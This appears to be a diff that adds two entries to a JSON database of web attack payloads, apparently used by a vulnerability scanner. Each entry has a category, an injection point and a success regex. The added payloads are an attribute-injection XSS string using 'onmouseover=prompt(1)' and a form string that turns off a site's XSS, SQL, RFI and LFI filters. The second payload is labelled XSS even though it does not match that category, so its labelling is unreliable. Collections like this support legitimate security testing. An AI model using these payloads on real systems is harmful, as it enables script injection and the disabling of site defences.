@@ -7192,5 +7192,27 @@
       "expected_status_code": 200,
       "success_regex": "<script|onerror|onload|alert\\(|javascript:"
     }
+  },
+  {
+    "payload_id": "OWP-474662",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "%20onmouseover=prompt(1)%20xss=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
+  },
+  {
+    "payload_id": "OWP-474676",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "form_parameter",
+    "payload_string": "get_filter=0&post_filter=0&cookie_filter=0&xss_filter=0&rfi_filter=0&lfi_filter=0&sql_filter=0&email_notify=1&notify_email=$mail&referer_filter=0&referer_trigger=&ex_list=&ip_tracking=0&confirm=obviously",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script|onerror|onload|alert\\(|javascript:"
+    }
   }
 ]
